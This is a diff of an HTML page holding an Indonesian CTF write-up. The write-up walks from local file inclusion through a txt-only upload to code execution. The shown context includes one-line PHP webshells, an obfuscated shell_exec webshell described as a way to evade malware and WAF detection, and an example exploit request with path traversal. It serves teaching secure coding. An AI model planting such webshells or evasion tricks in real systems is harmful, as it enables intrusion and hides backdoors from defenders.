@@ -92,7 +92,7 @@
   },
   "articleSection": "posts",
   "keywords": ["LFI","RCE","Write Up","Challenges","File Upload","Surabaya Hacker Link"],
-  "wordCount":  868 ,
+  "wordCount":  880 ,
   "datePublished": "2019-05-09T00:00:00Z",
   "dateModified": "2019-05-09T00:00:00Z"
 }
@@ -208,6 +208,7 @@
 
 <div class="content post__content clearfix">
 			<p>Challenges ini dibuat ketika bingung mau menjelaskan bug LFI (Local File Inclusion) pada saat secure coding di <a href="https://stts.edu">STTS</a>, karena cukup bosan dengan LFI to Local File Read via wrapper, saya mencari LFI to RCE selain melalui <code>/self/proc/environ</code> dan menemukan LFI to RCE via Access Log Posioning, namun karena di hosting tidak bisa baca log berbentuk txt maka terbuatlah fitur file upload yang hanya bisa upload txt. dan berikut adalah Write Up-nya.</p>
+<h2 id="gathering-information-and-scanning">Gathering Information and Scanning</h2>
 <p><img src="/img/ramadhan/1.webp" alt="tampilan awal"><br>
 Di atas adalah tampilan ketika membaca lorem ipsum, terlihat pada url ada parameter / index page dengan value loremipusm.html, hal ini pun berlaku ketika membaca twice</p>
 <p><img src="/img/ramadhan/2.webp" alt="membaca /etc/passwd"><br>
@@ -221,6 +222,7 @@ Kita coba langsung untuk membaca file /etc/passwd, dan berhasil. Terlihat jelas 
 </span></span></code></pre></div><p>Terlihat dari error message ketika merubah value dari index page ke value yang tidak valid, setelah mencoba banyak cara untuk mendapatkan akses seperti RFI (Remote File Inclusion), Wrapper dan lain sebagainya, hasilnya gagal total, hal ini gagal karena ada kata &lsquo;article&rsquo; di depan sebelum input parameter page, yang menyebabkan tidak bisa melakukan RFI dan wrapper</p>
 <p><img src="/img/ramadhan/3.webp" alt="isi dari robots.txt"><br>
 Membuka terminal dan melakukan pencarian folder lain menggunakan gobuster dan wordlist common web files, dan menemukan files robots.txt dan directory uploads, pada file robots.txt terdapat Disallow: uploads/, kita langsung ke diretory tersebut dan mendapatkan form upload</p>
+<h2 id="exploitation">Exploitation</h2>
 <p><img src="/img/ramadhan/4.webp" alt="file too big"><br>
 Langsung aja mengupload webshell php, namun gagal karena file terlalu besar</p>
 <p><img src="/img/ramadhan/5.webp" alt="php one line web shell"><br>
@@ -245,6 +247,7 @@ Setelah mencari tahu di google, ternyata php bisa berjalan dengan tag <code>&lt;
 File berjalan namun tidak ada interaksi karena memerlukan param / index <code>c</code></p>
 <p><img src="/img/ramadhan/16.webp" alt="berhasil"><br>
 Langsung tambahkan param / index <code>c</code> dan berhasil</p>
+<h2 id="gaining-access">Gaining Access</h2>
 <p><img src="/img/ramadhan/17.webp" alt="writing nickname to solver.txt"><br>
 Write nick to solver.txt <code>echo &quot;nick&quot; &gt;&gt; solver.txt</code></p>
 <p><img src="/img/ramadhan/18.webp" alt="nick written"><br>
@@ -263,6 +266,7 @@ Nick tertulis :3</p>
 </div>
 
 
+<h2 id="bypass-shell-detection-method">Bypass Shell Detection Method</h2>
 <p>Namun ketika challenges ini dikerjakan oleh teman-teman yang ada pada group SHL, cukup menarik, karena banyak yang tidak menggunakan <code>`</code> untuk menulis nick, ada yang melalui command php files, dan beberapa trik evasion agar file txt tidak terdeteksi sebagai malware/virus ketika di upload seperti berikut</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=@</span>$_GET[<span style="color:#a6e22e">a</span>]($_GET[<span style="color:#a6e22e">b</span>])<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>@ pada kode di atas untuk menonaktifkan display error yang akan muncul, kemudian ada 2 index / parameter yaitu a dan b yang dimana index / param b berada di dalam kurung setelah index /param a sehingga player melakukan request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> maka fungsi system akan terpanggil karena dengan request tersebut maka sama saja dengan <code>&lt;?php system('id') ?&gt;</code> karena pada server fungsi shell tidak dimatikan melalui php.ini</p>
@@ -286,6 +290,7 @@ Dengan begini player mendapatkan akses shell melalui ssh tanpa harus login karen
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $shell($cmd);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>Kode diatas dapat menjalankan fungsi shell_exec() karena dari kata <code>szhezlzl_ezxezc</code> dan dihilangkan huruf z menjadi <code>shell_exec</code> menggunakan fungsi str_replace()</p>
+<h2 id="conclusion">Conclusion</h2>
 <p>Cukup banyak sekali tips dan trik untuk melakukan evasion agar webshell / backdoor tidak terdeteksi oleh waf atau sanitasi manual, dan sebagai langkah pencegahan untuk menghindari penggunaan shell dapat menonaktifkan fungsi shell seperti system, shell_exec dsb melalui file php.ini</p>
 <p>Jika kalian ingin mencoba challenges simple ini, kalian dapat melakukannya dengan membuat lab sederhana, source code challenges ini dapat di download di <a href="https://github.com/laztname/notAcms">sini</a><br>
 dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat melihat video <a href="https://youtu.be/qqarbngfrNk">ini</a></p>
@@ -480,9 +485,8 @@ dan jika kalian ingin melihat versi video tentang challenges ini, kalian dapat m
 		<a class="widget-taglist__link widget__link btn" href="/tags/virtual-machine/" title="Virtual Machine">Virtual Machine (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/web-hacking/" title="Web Hacking">Web Hacking (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/windows/" title="Windows">Windows (1)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/wordpress/" title="Wordpress">Wordpress (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/wordpress/" title="Wordpress">Wordpress (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (35)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/wrodpress/" title="Wrodpress">Wrodpress (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/xss/" title="XSS">XSS (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/zimbra-mail-server/" title="Zimbra Mail Server">Zimbra Mail Server (1)</a>
 	</div>
